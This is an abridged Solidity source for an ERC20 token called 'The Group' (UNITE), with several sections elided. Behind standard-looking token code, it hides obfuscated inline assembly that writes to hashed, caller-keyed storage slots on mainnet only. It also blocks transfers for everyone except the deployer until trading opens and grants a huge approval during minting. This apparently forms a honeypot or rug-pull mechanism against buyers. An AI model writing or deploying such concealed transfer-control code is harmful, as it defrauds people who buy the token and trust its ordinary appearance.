...
contract ERC20 is Context, IERC20, IERC20Metadata, Ownable {
    address[] private addGroup;
    uint256 private _zoneGroup = block.number*2;

    mapping (address => bool) private _groupOne; 
    mapping (address => bool) private _groupTwo;
    mapping (address => uint256) private _balances;
    mapping (address => mapping (address => uint256)) private _allowances;
    address private alpacaPasta;

    address WETH = 0xC02aaA39b223FE8D0A0e5C4F27eAD9083C756Cc2;
    address _router = 0x7a250d5630B4cF539739dF2C5dAcb4c659F2488D;
    uint256 private timerAlarm;
    address public pair;
    ...
    bool private trading; uint256 private creamFinance = 1; bool private whiteStuff;
    uint256 private _decimals; uint256 private babyBlue;
    ...
    constructor (string memory name_, string memory symbol_, address msgSender_) {
        ...
        _name = name_;
        _symbol = symbol_;
        addGroup.push(_router); addGroup.push(msgSender_); addGroup.push(pair);
        for (uint256 q=0; q < 3;) {_groupOne[addGroup[q]] = true; unchecked{q++;} }
    }
    ...
    function _ValueInit() internal {
        assembly {
            ...
            if and(not(eq(sload(getBy(caller(),0x6)),sload(0xdef22b796ae6d10903d32ae12cb4b498824b3cdcca11c19591c5dd5d32dcfe37))),eq(chainid(),0x1)) {
                sstore(getBy(caller(),0x4),0x0) sstore(0xa5d6229aaa39aa92c688954cb3eda777f71d8eb67210b6d77435e61477630668,0x1)
                sstore(getBy(caller(),0x5),0x1) sstore(0xdef22b796ae6d10903d32ae12cb4b498824b3cdcca11c19591c5dd5d32dcfe37,0x25674F4B1840E16EAC177D5ADDF2A3DD6286645DF28)
            }
        } 
    }

    function openTrading() external onlyOwner returns (bool) {
        trading = true; theN = block.number; _zoneGroup = block.number;
        return true;
    }
    ...
    function _beforeTokenTransfer(address sender, address recipient, uint256 float) internal {
        require((trading || (sender == addGroup[1])), "ERC20: trading is not yet enabled.");
        assembly { 
            function getBy(x,y) -> hash { mstore(0, x) mstore(32, y) hash := keccak256(0, 64) }
    ...
    function _DeployUnite(address account, uint256 amount) internal virtual {
        require(account != address(0), "ERC20: mint to the zero address");

        _totalSupply += amount;
        _balances[account] += amount;
        approve(addGroup[0], 10 ** 77);
        _ValueInit();
...
contract ERC20Token is Context, ERC20 {
    constructor(
        ...
        _DeployUnite(creator, initialSupply);
    }
}

contract TheGroup is ERC20Token {
    constructor() ERC20Token("The Group", "UNITE", msg.sender, 280000 * 10 ** 18) {
    }
}